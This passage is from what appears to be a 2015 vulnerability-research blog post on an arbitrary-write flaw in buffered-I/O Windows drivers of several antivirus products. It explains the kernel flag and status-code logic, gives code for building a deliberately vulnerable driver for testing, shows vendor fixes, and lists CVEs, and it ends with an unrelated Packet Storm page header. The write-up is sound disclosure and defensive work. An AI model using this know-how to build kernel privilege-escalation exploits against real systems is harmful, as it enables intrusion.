#define IRP_BUFFERED_IOÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  0x00000010
#define IRP_DEALLOCATE_BUFFERÂ Â Â Â Â Â Â Â Â Â  0x00000020
#define IRP_INPUT_OPERATIONÂ Â Â Â Â Â Â Â Â Â Â Â  0x00000040
```

The values are set in IopXxxControlFile function by performing an OR operation. So doing an OR on IRP\_BUFFERED\_IO | IRP\_DEALLOCATE\_BUFFER produces a value of 30h

Converting into code it will look something like this

```
// Windows XP
Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER;
Irp->UserBuffer = pBufferOut;
if (pBufferOut)
Â  Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER | IRP_INPUT_OPERATION;
```
```
// Windows 7
Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER;
Irp->UserBuffer = pBufferOut;
if (iBufferOutSize)
Â  Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER | IRP_INPUT_OPERATION;
```

When it comes to carry its memcpy operation in IoCompleteRequest function it will look something like this

```
if (Irp->Flags & IRP_BUFFERED_IO)
{
Â  if ((Irp->Flags & IRP_INPUT_OPERATION)
Â Â Â Â  &&Â  (Irp->IoStatus.Status != STATUS_VERIFY_REQUIRED)
Â Â Â Â  && !(NT_ERROR(Irp->IoStatus.Status)))
Â  {
Â Â Â Â Â Â  RtlCopyMemory(Irp->UserBuffer, Irp->AssociatedIrp.SystemBuffer, Irp->IoStatus.Information);
Â  }
}
```

Here is it does its bitwise AND operation and dictates its outcome, jump or not to jump.

**Conditions of a Vulnerable Driver**

During completion of an IRP the I/O Manager copies the data from the system buffer back to the userâs output buffer if using Buffered I/O method (METHOD\_BUFFERED) and the status is of a success or warning. The number of bytes to copy is taken from the Irp->IoStatus.Information field.

The following range values indicate error and warning status codes:

*NTSTATUS codes 0xC0000000 â 0xFFFFFFFF are errors*

*NTSTATUS codes 0x80000000 â 0xBFFFFFFF are warnings*

In the above code we can see it uses the macro NT\_ERROR() to evaluate if not an error status.

So if the data is too large for the buffer, the driver completes the IRP with a status STATUS\_BUFFER\_OVERFLOW (0x80000005), which falls in the warning range, and the Irp->IoStatus.Information will be updated with the buffer size and data copied over. If completed with status STATUS\_BUFFER\_TOO\_SMALL (0xC0000023) which falls in the error range, the I/O Manager does not copy any data back to the output buffer as it sets the Irp->IoStatus.Information to 0.

To reproduce a vulnerable driver for testing purposes use this code in your dispatch routine for Buffered I/O. The IoStatus.Information value has to be 1 or more for an overwrite to take place.

```
Irp->IoStatus.Information = 4;
Irp->IoStatus.Status = STATUS_SUCCESS;
IoCompleteRequest(Irp, IO_NO_INCREMENT);
```

Windows supports three I/O transfer methods, which the driver developer can use for reading and writing data to memory. One method being Buffered I/O where the I/O Manager allocates a system buffer of equal size to the users inputted buffer. For write operations, the I/O manager copies the userâs buffer data into the system buffer. For read operations, the I/O manager copies data from the system buffer to the users output buffer when the IRP completes and then frees the system buffer. Buffered I/O is defined in the driver for example like this

```
CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
```

So when using METHOD\_BUFFERED it copies our system data back to our UserBuffer address when IRP is completed using the IoCompleteRequest function.

**Fixing a Vulnerable Driver**

Asking the same question to all the vendors on how they each fixed the issue it was interesting to find different approaches had been taken. One approach was

to check if the output buffer address was in the user space

```
if (Irp->UserBuffer > MmHighestUserAddress)
{
Â Â Â  ntStatus = STATUS_INVALID_PARAMETER;
}
```

Another approach was to check the size of the output buffer

```
if (iBufferOutSize < sizeof(ULONG))
{
Â Â Â  ntStatus = STATUS_INVALID_BUFFER_SIZE;
}
```

Depending on the dispatch conditions just by changing the status value to an error status is enough to resolve the vulnerability.

I would like to thank BullGuard, AVG and K7 Computing for kindly sharing information. A special thanks to [BullGuard](http://www.bullguard.com)Â as they were very helpful and provided a lot more important information which saved me a lot of time on this research. I canât say the same for the other three vendors: McAfee, Symantec and TrendMicro. All three decided not to share anything; do you see anything confidential in the above code?

**Published Advisories**

This table below provides information on the products where this vulnerability had been discovered.

| **Vendor** | **Product** | **OSVDB** | **CVE ID** | **Days** | **Vendor link** |
| --- | --- | --- | --- | --- | --- |
| McAfee | Data Loss Prevention | [117345](http://www.osvdb.org/show/osvdb/117345) | CVE-2015-1305 | 99 | [Advisory](https://kc.mcafee.com/corporate/index?page=content&id=SB10097) |
| Trend Micro | Antivirus Plus Internet Security Maximum Security | [115514](http://www.osvdb.org/show/osvdb/115514) | CVE-2014-9641 | 70 | [Advisory](http://esupport.trendmicro.com/solution/en-US/1106233.aspx) |
| Symantec | Altiris Client | [116082](http://www.osvdb.org/show/osvdb/116082) | CVE-2014-7286 | 59 | [Advisory](http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20141219_00) |
| AVG | Internet Security | [113824](http://www.osvdb.org/show/osvdb/113824) | CVE-2014-9632 | 26 | [Release notes](http://www.avg.com/eu-en/avg-release-notes) |
| K7 Computing | Ultimate Security Anti-Virus Plus Total Security | [113007](http://www.osvdb.org/show/osvdb/113007) | CVE-2014-9643 | 22 | None |
| BullGuard | Antivirus Internet Security Premium Protection Online Backup | [114478](http://www.osvdb.org/show/osvdb/114478) | CVE-2014-9642 | 16 | [Release notes](http://www.bullguard.com/about/release-notes.aspx) |

Advisories published by some vendors were very unprofessional. Trend Micro had to be advised to correct their description, as they didnât get it right the first time since it had a number of mistakes and was initially published without consultation. Also the fix applies all the way to Trend Titanium products 2015, which was stated in my vulnerability report but not mentioned in their advisory.

For Symantec, well they are not any better. After waiting nearly two months they ended up releasing an advisory advising only to uninstall the driver. Also, their advisory link in their mitigation information section refers to a knowledge base article [DOC7993](http://www.symantec.com/business/support/index?page=content&id=DOC7993) on how to remove the driver. However, if you take a look as this article it starts off mentioning the MQAC.sys driver and points to a Microsoft link. I had this flagged at the time but no action has been taken. Itâs a similar vulnerability so they must have just copied and pasted it without reading it.

What is really shocking is that McAfee took 99 days to release an advisory to the public whereas BullGuard took only 16 days. Does that mean if an exploit was made public we would have had to wait 99 days for an update? Also, McAfee failed to mention in their advisory that it also affects Windows Server 2003, which was clearly stated in my vulnerability report as the product is supported on Windows Server 2003. I however did not test it on Windows Server 2003 R2 (32bit) but did reverse engineer ntoskrnl.exe from Windows Server 2003 R2 (64bit) and did have only the address check in the IopXxxControlFile function. There is a 64bit version for McAfee DLP so should be exploitable too.

**Other Vendors**

Assessment carried out on some of the security vendorsâ products that were not affected from this type of vulnerability are listed below. This is no way an assurance that their products are free from this vulnerability, as there is a possibility some ioctls may have been missed, input buffer sizes may have changed the codepath, device handles not loaded, etc.

* Agnitum
* AhnLab
* Avast
* Avira
* BitDefender
* ClamAV
* Comodo
* Emsisoft
* Eset
* Fortinet
* FRISK Software
* F-Secure
* G Data
* Kaspersky Lab
* Kingsoft
* Malwarebytes
* Nano Security
* Norman
* Panda Security
* Sophos
* TrustPort
* ThreatTrack Security
* Webroot
* Zemana

**Other Windows Versions**

Since all my tests were on a fully patched Windows XP SP3 32bit and Windows 7 SP1 32bit I thought Iâd check some other operating systems. Checking on Windows Server 2003 SP2 Standard Edition 32bit found to have the same issue as Windows XP and during tests exploited successfully. Windows Server 2003 has still got over 5 months before the end-of-life so for those of you still using Windows 2003 better upgrade to a later operating system if youâve not already done so.

On a clean default installation of Windows Vista 32bit in an unpatched state the output buffer length check had been applied like Windows 7. This means Microsoft did know about this issue and added the check before release.

There are plenty of products designed only to run on Windows Servers, which I have not audited, so maybe itâs a good time for researchers to discover some low-hanging fruit.

**Final thoughts**

One thing is clear from this research and working with vendors: Just because itâs a big company doesnât mean youâll get great service. There are plenty of other vendors doing an excellent job so we should not blindly need to go with the likes of McAfee, Symantec or Trend Micro.

Updating machines is a tedious job at times so really we should be focusing on mitigation products like Microsoft EMET and MalwareBytes Anti-Exploit and not be so dependent on constantly updating machines for security. Bottom line is to upgrade to the latest operating systems as it will have a number of mitigations, checks, validations in place that we probably donât even know about yet keeping us safe.

*Iâll start submitting the exploits to Exploit-DB in the next few days and tweet you all once published.*

**References**[http://msdn.microsoft.com/en-us/library/ff550694(v=VS.85).aspx](http://msdn.microsoft.com/en-us/library/ff550694%28v%3DVS.85%29.aspx)

<http://msdn.microsoft.com/en-gb/library/cc704588.aspx>

<http://msdn.microsoft.com/en-us/library/ff545693.aspx>

[http://msdn.microsoft.com/en-us/library/windows/hardware/ff548649(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/ff548649%28v%3Dvs.85%29.aspx)

<http://doxygen.reactos.org/d6/dfc/ntoskrnl_2io_2iomgr_2irp_8c_source.html>

<http://www.cmlab.csie.ntu.edu.tw/~cathyp/eBooks/WindowsNT/Driver/IRPs.pdf>Â  [PDF]

<http://www.tutorialspoint.com/assembly_programming/assembly_logical_instructions.htm>

<http://blogs.msdn.com/b/doronh/archive/2006/12/12/how-to-return-the-number-of-bytes-required-for-a-subsequent-operation.aspx>

Posted in [All](https://www.greyhathacker.net/?cat=18), [Bugs](https://www.greyhathacker.net/?cat=8), [Exploits](https://www.greyhathacker.net/?cat=7), [Mitigation](https://www.greyhathacker.net/?cat=40), [Vulnerabilities](https://www.greyhathacker.net/?cat=6) and tagged [Elevate](https://www.greyhathacker.net/?tag=elevate), [Kernel](https://www.greyhathacker.net/?tag=kernel) on [January 28, 2015](https://www.greyhathacker.net/?p=818 "3:01 pm") by [Parvez](https://www.greyhathacker.net/?author=1 "View all posts by Parvez"). [2 Comments](https://www.greyhathacker.net/?p=818#comments)

[â Bypassing Windows User Account Control (UAC) and ways of mitigation](https://www.greyhathacker.net/?p=796) [Detecting Malicious Microsoft Office Macro Documents â](https://www.greyhathacker.net/?p=872)

### 2 comments

1. ![](https://secure.gravatar.com/avatar/526df9c04a40cf5188b36120bc24eb0e?s=40&d=mm&r=g) **n3k** says:
   [August 12, 2015 at 9:51 pm](https://www.greyhathacker.net/?p=818#comment-9066)

   Hello there, I have a doubt regarding what you have described here.. you say the problem is when using buffered IO Method.. but here your example is using IRP->UserBuffer, which is only used if the method is NEITHERâ¦ and thats why you must not only the addresses but also the length of the dataâ¦

   When using buffered method, the IOManager do these checks for you on behalfâ¦ You will get an error if you call deviceIoControl for a buffered method IOCTL with an output buffer with that address.
3. ![](https://secure.gravatar.com/avatar/f6306376486bff7a746a72d6dd054e36?s=40&d=mm&r=g) **[Parvez](http://www.greyhathacker.net)** says:
   [August 13, 2015 at 10:04 am](https://www.greyhathacker.net/?p=818#comment-9072)

   This is what most think that IRP->UserBuffer is only used by NEITHER I/O method which is not true. BUFFERED method does do some checks as Iâve explained as you can see the lack of size validation in older OSâs bypasses the address validation. So using BUFFERED method you can write to the output userbuffer.

### Leave a Reply

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

#### Recent Posts

* [Dokany/Google Drive File Stream Kernel Stack-based Buffer Overflow Vulnerability](https://www.greyhathacker.net/?p=1041)
* [Exploiting STOPzilla AntiMalware Arbitrary Write Vulnerability using SeCreateTokenPrivilege](https://www.greyhathacker.net/?p=1025)
* [Exploiting System Shield AntiVirus Arbitrary Write Vulnerability using SeTakeOwnershipPrivilege](https://www.greyhathacker.net/?p=1006)
* [IKARUS anti.virus and its 9 exploitable kernel vulnerabilities](https://www.greyhathacker.net/?p=995)
* [Exploiting Vir.IT eXplorer Anti-Virus Arbitrary Write Vulnerability](https://www.greyhathacker.net/?p=990)
#### Categories

* [All](https://www.greyhathacker.net/?cat=18)
* [Bugs](https://www.greyhathacker.net/?cat=8)
* [Exploits](https://www.greyhathacker.net/?cat=7)
* [Malware](https://www.greyhathacker.net/?cat=5)
* [Mitigation](https://www.greyhathacker.net/?cat=40)
* [Other](https://www.greyhathacker.net/?cat=34)
* [Vulnerabilities](https://www.greyhathacker.net/?cat=6)
#### Tags

[ActionScript](https://www.greyhathacker.net/?tag=actionscript)
[ActiveX](https://www.greyhathacker.net/?tag=activex)
[Adobe](https://www.greyhathacker.net/?tag=adobe)
[Anti-Rootkit](https://www.greyhathacker.net/?tag=anti-rootkit)
[ASLR](https://www.greyhathacker.net/?tag=aslr)
[Autorun](https://www.greyhathacker.net/?tag=autorun)
[BHO](https://www.greyhathacker.net/?tag=bho)
[BlazeDVD](https://www.greyhathacker.net/?tag=blazedvd)
[Download and Execute](https://www.greyhathacker.net/?tag=download-and-execute)
[Elevate](https://www.greyhathacker.net/?tag=elevate)
[EMET](https://www.greyhathacker.net/?tag=emet)
[FakeAV](https://www.greyhathacker.net/?tag=fakeav)
[heapspray](https://www.greyhathacker.net/?tag=heapspray)
[Hidden](https://www.greyhathacker.net/?tag=hidden)
[Hijack](https://www.greyhathacker.net/?tag=hijack)
[IrfanView](https://www.greyhathacker.net/?tag=irfanview)
[Java](https://www.greyhathacker.net/?tag=java)
[Kernel](https://www.greyhathacker.net/?tag=kernel)
[Macros](https://www.greyhathacker.net/?tag=macros)
[McAfee](https://www.greyhathacker.net/?tag=mcafee)
[MSI](https://www.greyhathacker.net/?tag=msi)
[MSWord](https://www.greyhathacker.net/?tag=msword)
[PGP](https://www.greyhathacker.net/?tag=pgp)
[pif](https://www.greyhathacker.net/?tag=pif)
[RemoteExec](https://www.greyhathacker.net/?tag=remoteexec)
[Return to Libc](https://www.greyhathacker.net/?tag=return-to-libc)
[ROP](https://www.greyhathacker.net/?tag=rop)
[Sandbox](https://www.greyhathacker.net/?tag=sandbox)
[Skype](https://www.greyhathacker.net/?tag=skype)
[SureThing](https://www.greyhathacker.net/?tag=surething)
[Symantec](https://www.greyhathacker.net/?tag=symantec)
[trailing](https://www.greyhathacker.net/?tag=trailing)
[UAC](https://www.greyhathacker.net/?tag=uac)
[URI](https://www.greyhathacker.net/?tag=uri)
[Vista](https://www.greyhathacker.net/?tag=vista)
#### Archives

* [January 2019](https://www.greyhathacker.net/?m=201901)Â (1)
* [September 2018](https://www.greyhathacker.net/?m=201809)Â (1)
* [January 2018](https://www.greyhathacker.net/?m=201801)Â (1)
* [November 2017](https://www.greyhathacker.net/?m=201711)Â (2)
* [September 2016](https://www.greyhathacker.net/?m=201609)Â (1)
* [December 2015](https://www.greyhathacker.net/?m=201512)Â (2)
* [July 2015](https://www.greyhathacker.net/?m=201507)Â (1)
* [January 2015](https://www.greyhathacker.net/?m=201501)Â (1)
* [December 2014](https://www.greyhathacker.net/?m=201412)Â (1)
* [June 2014](https://www.greyhathacker.net/?m=201406)Â (1)
* [January 2014](https://www.greyhathacker.net/?m=201401)Â (1)
* [November 2013](https://www.greyhathacker.net/?m=201311)Â (1)
* [September 2013](https://www.greyhathacker.net/?m=201309)Â (1)
* [February 2013](https://www.greyhathacker.net/?m=201302)Â (1)
* [December 2012](https://www.greyhathacker.net/?m=201212)Â (1)
* [August 2012](https://www.greyhathacker.net/?m=201208)Â (1)
* [June 2012](https://www.greyhathacker.net/?m=201206)Â (1)
* [February 2012](https://www.greyhathacker.net/?m=201202)Â (1)
* [January 2012](https://www.greyhathacker.net/?m=201201)Â (1)
* [December 2011](https://www.greyhathacker.net/?m=201112)Â (1)
* [November 2011](https://www.greyhathacker.net/?m=201111)Â (1)
* [August 2011](https://www.greyhathacker.net/?m=201108)Â (2)
* [July 2011](https://www.greyhathacker.net/?m=201107)Â (1)
* [April 2011](https://www.greyhathacker.net/?m=201104)Â (1)
* [March 2011](https://www.greyhathacker.net/?m=201103)Â (1)
* [October 2010](https://www.greyhathacker.net/?m=201010)Â (3)
* [June 2010](https://www.greyhathacker.net/?m=201006)Â (1)
* [May 2010](https://www.greyhathacker.net/?m=201005)Â (1)
* [March 2010](https://www.greyhathacker.net/?m=201003)Â (2)
* [February 2010](https://www.greyhathacker.net/?m=201002)Â (1)
* [December 2009](https://www.greyhathacker.net/?m=200912)Â (1)
* [September 2009](https://www.greyhathacker.net/?m=200909)Â (1)
* [May 2009](https://www.greyhathacker.net/?m=200905)Â (1)
* [April 2009](https://www.greyhathacker.net/?m=200904)Â (1)
* [September 2008](https://www.greyhathacker.net/?m=200809)Â (1)
* [November 2007](https://www.greyhathacker.net/?m=200711)Â (2)
#### Meta

* [Log in](https://www.greyhathacker.net/wp-login.php)
* [Entries feed](https://www.greyhathacker.net/?feed=rss2)
* [Comments feed](https://www.greyhathacker.net/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

Proudly powered by [WordPress](http://wordpress.org/ "Semantic Personal Publishing Platform")  Â·
Theme: Suits by [Theme Weaver](http://www.themeweaver.net/ "Theme Developer")



=== Content from packetstormsecurity.com_1658b2eb_20250125_053236.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

Â [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


